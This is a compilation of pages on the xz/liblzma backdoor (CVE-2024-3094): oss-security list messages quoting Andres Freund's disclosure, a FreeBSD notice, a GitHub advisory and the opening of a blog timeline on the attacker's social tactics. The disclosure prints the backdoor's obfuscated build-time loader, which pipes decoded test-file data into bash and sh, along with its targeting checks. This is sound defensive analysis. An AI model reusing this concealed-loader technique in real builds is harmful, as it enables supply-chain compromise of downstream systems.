> (about 0.5s on my older system)
>
>
> fast:
> env -i LANG=C TERM=foo /usr/sbin/sshd -h
> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
> ...
>
> (about 0.01s on the same system)
>
>
> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
> are obviously lots of servers linking to libsystemd.
>
>
> == Analyzing the injected code ==
>
> I am *not* a security researcher, nor a reverse engineer.  There's lots of
> stuff I have not analyzed and most of what I observed is purely from
> observation rather than exhaustively analyzing the backdoor code.
>
> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
> execution diverges between the backdoor being active and not. Then also gdb,
> setting breakpoints before the divergence.
>
>
> The backdoor initially intercepts execution by replacing the ifunc resolvers
> crc32_resolve(), crc64_resolve() with different code, which calls
> _get_cpuid(), injected into the code (which previously would just be static
> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
> symbol names.
>
> These functions get resolved during startup, because sshd is built with
> -Wl,-z,now, leading to all symbols being resolved early. If started with
> LD_BIND_NOT=1 the backdoor does not appear to work.
>
>
> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> 'completed' variable is 0 and increments it, returning the normal cpuid result
> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
>
> In the second invocation crc64_resolve() appears to find various information,
> like data from the dynamic linker, program arguments and environment. Then it
> perform various environment checks, including those above. There are other
> checks I have not fully traced.
>
> If the above decides to continue, the code appears to be parsing the symbol
> tables in memory. This is the quite slow step that made me look into the issue.
>
>
> Notably liblzma's symbols are resolved before many of the other libraries,
> including the symbols in the main sshd binary.  This is important because
> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
>
>
> To be able to resolve symbols in libraries that have not yet loaded, the
> backdoor installs an audit hook into the dynamic linker, which can be observed
> with gdb using
>   watch _rtld_global_ro._dl_naudit
> It looks like the audit hook is only installed for the main binary.
>
> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
> main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
> resolved.  When called for that symbol, the backdoor changes the value of
> RSA_public_decrypt@....plt to point to its own code.  It does not do this via
> the audit hook mechanism, but outside of it.
>
> For reasons I do not yet understand, it does change sym.st_value *and* the
> return value of from the audit hook to a different value, which leads
> _dl_audit_symbind() to do nothing - why change anything at all then?
>
> After that the audit hook is uninstalled again.
>
> It is possible to change the got.plt contents at this stage because it has not
> (and can't yet) been remapped to be read-only.
>
>
> I suspect there might be further changes performed at this stage.
>
>
> == Impact on sshd ==
>
> The prior section explains that RSA_public_decrypt@....plt was redirected to
> point into the backdoor code. The trace I was analyzing indeed shows that
> during a pubkey login the exploit code is invoked:
>
>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
>
> The backdoor then calls back into libcrypto, presumably to perform normal authentication
>
>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
>
>
> I have not yet analyzed precisely what is being checked for in the injected
> code, to allow unauthorized access. Since this is running in a
> pre-authentication context, it seems likely to allow some form of access or
> other form of remote code execution.
>
> I'd upgrade any potentially vulnerable system ASAP.
>
>
> == Bug reports ==
>
> Given the apparent upstream involvement I have not reported an upstream
> bug. As I initially thought it was a debian specific issue, I sent a more
> preliminary report to security@...ian.org.  Subsequently I reported the issue
> to distros@. CISA was notified by a distribution.
>
> Red Hat assigned this issue CVE-2024-3094.
>
>
> == Detecting if installation is vulnerable ==
>
> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
> system is vulnerable, attached here. Thanks!
>
>
> Greetings,
>
> Andres Freund

--
Alexander E. Patrakov

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.freebsd.org_10ddd638_20250111_034018.html ===


# Disclosed backdoor in xz releases - FreeBSD not affected

* ***Reply:*** [Shawn Webb : "Re: Disclosed backdoor in xz releases - FreeBSD not affected"](../2024-March/000249.html)
* ***Go to:***  [ [bottom of page](#footer) ] [ [top of archives](../index.html) ] [ [this month](index.html) ]

***From:*** Gordon Tetlow <gordon\_at\_tetlows.org>

***Date:*** Fri, 29 Mar 2024 17:02:14 UTC
```
FreeBSD is not affected by the recently announced backdoor included in the 5.6.0 and 5.6.1 xz releases.

All supported FreeBSD releases include versions of xz that predate the affected releases.

The main, stable/14, and stable/13 branches do include the affected version (5.6.0), but the backdoor components were excluded from the vendor import. Additionally, FreeBSD does not use the upstream's build tooling, which was a required part of the attack. Lastly, the attack specifically targeted x86_64 Linux systems using glibc.

The FreeBSD ports collection does not include xz/liblzma.

Reference:
https://www.openwall.com/lists/oss-security/2024/03/29/4

Best regards,
Gordon Tetlow
Hat: security-officer

```

* ***Reply:*** [Shawn Webb : "Re: Disclosed backdoor in xz releases - FreeBSD not affected"](../2024-March/000249.html)
* ***Go to:***  [ top of page ] [ [top of archives](../index.html) ] [ [this month](index.html) ]

[Original text of this message](000248.txt)



=== Content from www.openwall.com_fb459833_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](7) [[next>]](9) [[<thread-prev]](6) [[thread-next>]](9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CA+aC4ku4Gkk3m0OHTr8nveHuxhW1bbh5GniaGxC_ahLMFm0k+g@mail.gmail.com>
Date: Fri, 29 Mar 2024 09:28:58 -0700
From: Anthony Liguori <anthony@...emonkey.ws>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

I would not trust any content from tukanni.org including older tarballs.

The malicious individual has access to the signing key clearly and could
modify older tarballs easily.

Regards,

Anthony Liguori

On Fri, Mar 29, 2024, 9:18 AM Alex Gaynor <alex.gaynor@...il.com> wrote:

> Hi Andres,
>
> Thanks for writing this up. Just to make sure I understand the action
> item here: folks who are building their own xz, should switch to a
> release prior to 5.6.0, as those are the only ones known to be
> unaffected?
>
> Alex
>
> On Fri, Mar 29, 2024 at 12:10 PM Andres Freund <andres@...razel.de> wrote:
> >
> > Hi,
> >
> > After observing a few odd symptoms around liblzma (part of the xz
> package) on
> > Debian sid installations over the last weeks (logins with ssh taking a
> lot of
> > CPU, valgrind errors) I figured out the answer:
> >
> > The upstream xz repository and the xz tarballs have been backdoored.
> >
> > At first I thought this was a compromise of debian's package, but it
> turns out
> > to be upstream.
> >
> >
> > == Compromised Release Tarball ==
> >
> > One portion of the backdoor is *solely in the distributed tarballs*. For
> > easier reference, here's a link to debian's import of the tarball, but
> it is
> > also present in the tarballs for 5.6.0 and 5.6.1:
> >
> >
> <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>
> >
> > That line is *not* in the upstream source of build-to-host, nor is
> > build-to-host used by xz in git.  However, it is present in the tarballs
> > released upstream, except for the "source code" links, which I think
> github
> > generates directly from the repository contents:
> >
> > <https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
> > <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>
> >
> >
> > This injects an obfuscated script to be executed at the end of
> configure. This
> > script is fairly obfuscated and data from "test" .xz files in the
> repository.
> >
> >
> > This script is executed and, if some preconditions match, modifies
> > $builddir/src/liblzma/Makefile to contain
> >
> > am__test = bad-3-corrupt_lzma2.xz
> > ...
> > am__test_dir=$(top_srcdir)/tests/files/$(am__test)
> > ...
> > sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
> >
> >
> > which ends up as
> > ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "
> \-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
> >
> > Leaving out the "| bash" that produces
> >
> > ####Hello####
> > #��Z�.hj�
> > eval `grep ^srcdir= config.status`
> > if test -f ../../config.status;then
> > eval `grep ^srcdir= ../../config.status`
> > srcdir="../../$srcdir"
> > fi
> > export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048
> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
> >/dev/null) && head -c +724)";(xz -dc
> $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr
> "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw
> --lzma1 -dc|/bin/sh
> > ####World####
> >
> > After de-obfuscation this leads to the attached injected.txt.
> >
> >
> > == Compromised Repository ==
> >
> > The files containing the bulk of the exploit are in an obfuscated form in
> >   tests/files/bad-3-corrupt_lzma2.xz
> >   tests/files/good-large_compressed.lzma
> > committed upstream. They were initially added in
> >
> <https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>
> >
> > Note that the files were not even used for any "tests" in 5.6.0.
> >
> >
> > Subsequently the injected code (more about that below) caused valgrind
> errors
> > and crashes in some configurations, due the stack layout differing from
> what
> > the backdoor was expecting.  These issues were attempted to be worked
> around
> > in 5.6.1:
> >
> >
> <https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
> >
> <https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
> >
> <https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>
> >
> > For which the exploit code was then adjusted:
> >
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
> >
> > Given the activity over several weeks, the committer is either directly
> > involved or there was some quite severe compromise of their
> > system. Unfortunately the latter looks like the less likely explanation,
> given
> > they communicated on various lists about the "fixes" mentioned above.
> >
> >
> > Florian Weimer first extracted the injected code in isolation, also
> attached,
> > liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
> >
> >
> > == Affected Systems ==
> >
> > The attached de-obfuscated script is invoked first after configure,
> where it
> > decides whether to modify the build process to inject the code.
> >
> > These conditions include targeting only x86-64 linux:
> >     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo
> "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
> >
> > Building with gcc and the gnu linker
> >     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
> >     exit 0
> >     fi
> >     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
> >     exit 0
> >     fi
> >     LDv=$LD" -v"
> >     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
> >     exit 0
> >
> > Running as part of a debian or RPM package build:
> >     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =
> "xx86_64";then
> >
> > Particularly the latter is likely aimed at making it harder to reproduce
> the
> > issue for investigators.
> >
> >
> > Due to the working of the injected code (see below), it is likely the
> backdoor
> > can only work on glibc based systems.
> >
> >
> > Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> > distributions, and where they have, mostly in pre-release versions.
> >
> >
> > == Observing Impact on openssh server ==
> >
> > With the backdoored liblzma installed, logins via ssh become a lot
> slower.
> >
> > time ssh nonexistant@...alhost
> >
> > before:
> > nonexistant@...alhost: Permission denied (publickey).
> >
> > before:
> > real    0m0.299s
> > user    0m0.202s
> > sys     0m0.006s
> >
> > after:
> > nonexistant@...alhost: Permission denied (publickey).
> >
> > real    0m0.807s
> > user    0m0.202s
> > sys     0m0.006s
> >
> >
> > openssh does not directly use liblzma. However debian and several other
> > distributions patch openssh to support systemd notification, and
> libsystemd
> > does depend on lzma.
> >
> >
> > Initially starting sshd outside of systemd did not show the slowdown,
> despite
> > the backdoor briefly getting invoked. This appears to be part of some
> > countermeasures to make analysis harder.
> >
> > Observed requirements for the exploit:
> > a) TERM environment variable is not set
> > b) argv[0] needs to be /usr/sbin/sshd
> > c) LD_DEBUG, LD_PROFILE are not set
> > d) LANG needs to be set
> > e) Some debugging environments, like rr, appear to be detected. Plain gdb
> >    appears to be detected in some situations, but not others
> >
> > To reproduce outside of systemd, the server can be started with a clear
> > environment, setting only the required variable:
> >
> > env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
> >
> >
> > In fact, openssh does not need to be started as a server to observe the
> > slowdown:
> >
> > slow:
> > env -i LANG=C /usr/sbin/sshd -h
> >
> > (about 0.5s on my older system)
> >
> >
> > fast:
> > env -i LANG=C TERM=foo /usr/sbin/sshd -h
> > env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
> > ...
> >
> > (about 0.01s on the same system)
> >
> >
> > It's possible that argv[0] other /usr/sbin/sshd also would have effect -
> there
> > are obviously lots of servers linking to libsystemd.
> >
> >
> > == Analyzing the injected code ==
> >
> > I am *not* a security researcher, nor a reverse engineer.  There's lots
> of
> > stuff I have not analyzed and most of what I observed is purely from
> > observation rather than exhaustively analyzing the backdoor code.
> >
> > To analyze I primarily used "perf record -e intel_pt//ub" to observe
> where
> > execution diverges between the backdoor being active and not. Then also
> gdb,
> > setting breakpoints before the divergence.
> >
> >
> > The backdoor initially intercepts execution by replacing the ifunc
> resolvers
> > crc32_resolve(), crc64_resolve() with different code, which calls
> > _get_cpuid(), injected into the code (which previously would just be
> static
> > inline functions).  In xz 5.6.1 the backdoor was further obfuscated,
> removing
> > symbol names.
> >
> > These functions get resolved during startup, because sshd is built with
> > -Wl,-z,now, leading to all symbols being resolved early. If started with
> > LD_BIND_NOT=1 the backdoor does not appear to work.
> >
> >
> > Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> > 'completed' variable is 0 and increments it, returning the normal cpuid
> result
> > (via a new _cpuid()). It gets to be more interesting during
> crc64_resolve().
> >
> > In the second invocation crc64_resolve() appears to find various
> information,
> > like data from the dynamic linker, program arguments and environment.
> Then it
> > perform various environment checks, including those above. There are
> other
> > checks I have not fully traced.
> >
> > If the above decides to continue, the code appears to be parsing the
> symbol
> > tables in memory. This is the quite slow step that made me look into the
> issue.
> >
> >
> > Notably liblzma's symbols are resolved before many of the other
> libraries,
> > including the symbols in the main sshd binary.  This is important because
> > symbols are resolved, the GOT gets remapped read-only thanks to
> -Wl,-z,relro.
> >
> >
> > To be able to resolve symbols in libraries that have not yet loaded, the
> > backdoor installs an audit hook into the dynamic linker, which can be
> observed
> > with gdb using
> >   watch _rtld_global_ro._dl_naudit
> > It looks like the audit hook is only installed for the main binary.
> >
> > That hook gets called, from _dl_audit_symbind, for numerous symbols in
> the
> > main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
> > resolved.  When called for that symbol, the backdoor changes the value of
> > RSA_public_decrypt@....plt to point to its own code.  It does not do
> this via
> > the audit hook mechanism, but outside of it.
> >
> > For reasons I do not yet understand, it does change sym.st_value *and*
> the
> > return value of from the audit hook to a different value, which leads
> > _dl_audit_symbind() to do nothing - why change anything at all then?
> >
> > After that the audit hook is uninstalled again.
> >
> > It is possible to change the got.plt contents at this stage because it
> has not
> > (and can't yet) been remapped to be read-only.
> >
> >
> > I suspect there might be further changes performed at this stage.
> >
> >
> > == Impact on sshd ==
> >
> > The prior section explains that RSA_public_decrypt@....plt was
> redirected to
> > point into the backdoor code. The trace I was analyzing indeed shows that
> > during a pubkey login the exploit code is invoked:
> >
> >             sshd 1736357 [010] 714318.734008:          1  branches:uH:
>     5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0
> RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
> >
> > The backdoor then calls back into libcrypto, presumably to perform
> normal authentication
> >
> >             sshd 1736357 [010] 714318.734009:          1  branches:uH:
>     7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>
>    7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
> >
> >
> > I have not yet analyzed precisely what is being checked for in the
> injected
> > code, to allow unauthorized access. Since this is running in a
> > pre-authentication context, it seems likely to allow some form of access
> or
> > other form of remote code execution.
> >
> > I'd upgrade any potentially vulnerable system ASAP.
> >
> >
> > == Bug reports ==
> >
> > Given the apparent upstream involvement I have not reported an upstream
> > bug. As I initially thought it was a debian specific issue, I sent a more
> > preliminary report to security@...ian.org.  Subsequently I reported the
> issue
> > to distros@. CISA was notified by a distribution.
> >
> > Red Hat assigned this issue CVE-2024-3094.
> >
> >
> > == Detecting if installation is vulnerable ==
> >
> > Vegard Nossum wrote a script to detect if it's likely that the ssh
> binary on a
> > system is vulnerable, attached here. Thanks!
> >
> >
> > Greetings,
> >
> > Andres Freund
>
>
>
> --
> All that is necessary for evil to succeed is for good people to do nothing.
>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_56c5b540_20250111_034015.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-rxwq-x6h5-x525)

**CVE-2024-3094**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-rxwq-x6h5-x525)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2024-3094](/advisories/GHSA-rxwq-x6h5-x525)

## Malicious code was discovered in the upstream tarballs of...

Critical severity

Unreviewed

Published
Mar 29, 2024
to the GitHub Advisory Database
•
Updated Mar 29, 2024

## Package

No package listed—
[Suggest a package](/advisories/GHSA-rxwq-x6h5-x525/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0. The tarballs included extra .m4 files, which contained instructions for building with automake that did not exist in the repository. These instructions, through a series of complex obfuscations, extract a prebuilt object file from one of the test archives, which is then used to modify specific functions in the code while building the liblzma package. This issue results in liblzma being used by additional software, like sshd, to provide functionality that will be interpreted by the modified functions.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2024-3094>
* <https://access.redhat.com/security/cve/CVE-2024-3094>
* <https://bugzilla.redhat.com/show_bug.cgi?id=2272210>
* <https://www.openwall.com/lists/oss-security/2024/03/29/4>
* <https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)
Mar 29, 2024

Published to the GitHub Advisory Database
Mar 29, 2024

Last updated
Mar 29, 2024

### Severity

Critical

10.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

63.520%
 (98th percentile)

### Weaknesses

[CWE-506](/advisories?query=cwe%3A506)

### CVE ID

CVE-2024-3094

### GHSA ID

GHSA-rxwq-x6h5-x525

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-rxwq-x6h5-x525/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from boehs.org_b4d0d377_20250111_034006.html ===
[**Evan Boehs**](/) email ![A drawing of an astronaut in space](https://github.com/boehs.png) United States *is kickflippin*
# Everything I know about the XZ backdoor

**[state](/states/)**[evergreen](/state/evergreen)**[in](/locations/)**[blog](/in/blog)**[tags](/tags/)**

* [open-source](/tag/open-source)
**date**3/29/2024

---

*This publication was last updated at 12:49 PM EST on April 8th*

Recently, a backdoor was discovered in XZ, a popular library for lossless data compression. Initial research efforts were predominantly concentrated on unpacking the well-disguised attack vector, while the social aspects of the attack received only murmurings. To investigate this attack, I never read a line of code. Instead, I spent dozens of hours pouring over hundreds of discussion threads and mailing lists. I’ve concluded that while the events that unfolded are undoubtedly a tragedy, it was one of our own making — one of an ugly reality that quietly plays out every day. Our attacker was not naïve. They meticulously examined the culture of open source and then pounced on its norms, twisting them strategically to their benefit. If we continue to focus purely on technicalities, nothing will ever change. This story will play out time and time again, like it already has for decades. We must stop focusing on fuzzing and static analysis and instead turn our attention to the human costs of open source. We must learn. With this in mind, I present a timeline of the attack — one from a new perspective that’s too often ignored.

### 2021

JiaT75 (Jia Tan) creates their GitHub account.

The first commits they make are not to xz, but they are deeply suspicious. Specifically, they open a PR in libarchive: [Added error text to warning when untaring with bsdtar](https://github.com/libarchive/libarchive/pull/1609). This commit does a little more than it says. It replaces `safe_fprint` with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and ~~[lives on to this day](https://github.com/libarchive/libarchive/blob/master/tar/read.c#L374-L375)~~ ([patched](https://github.com/libarchive/libarchive/pull/2101)).

### 2022

In April 2022, Jia Tan submitted a patch via a mailing list. The contents of the patch are not relevant, but the events that follow are. A new persona — *Jigar Kumar* — enters, and begins [pressuring](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00565.html) for this patch to be merged.

Soon after, *Jigar Kumar* [begins](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00566.html) pressuring *Lasse Collin* to add another maintainer to XZ. In the fallout, there is much to learn about mental health in open source.

Three days after the emails pressuring *Lasse Collin* to add another maintainer, JiaT75 makes their first commit to xz: [Tests: Created tests for hardware functions.](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b). Since this commit, they become a regular contributor to xz (they are currently the second most active). It’s unclear exactly when they became trusted in this repository.

*Jigar Kumar* is [never seen again](https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=Kumar&x=0&y=0). Another account — [Dennis Ens](https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=from:%22Dennis+Ens%22) also participates in pressure, with a similar name+number formatted email. This account is also never seen outside of xz discussion, and neither have any associated accounts that have been discovered.

![](https://files.mastodon.social/accounts/avatars/000/023/457/original/ad501ceca43dd473.png)**[Glyph](https://mastodon.social/%40glyph/112180922900094371)** @glyph@mastodon.social

[@eb](https://social.coop/%40eb) I really hope that this causes an industry-wide reckoning with the common practice of letting your entire goddamn product rest on the shoulders of one overworked person having a slow mental health crisis without financially or operationally supporting them whatsoever. I want everyone who has an open source dependency to read this message [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html)

Mar 29, 2024, 20:43 558 retoots
### 2023

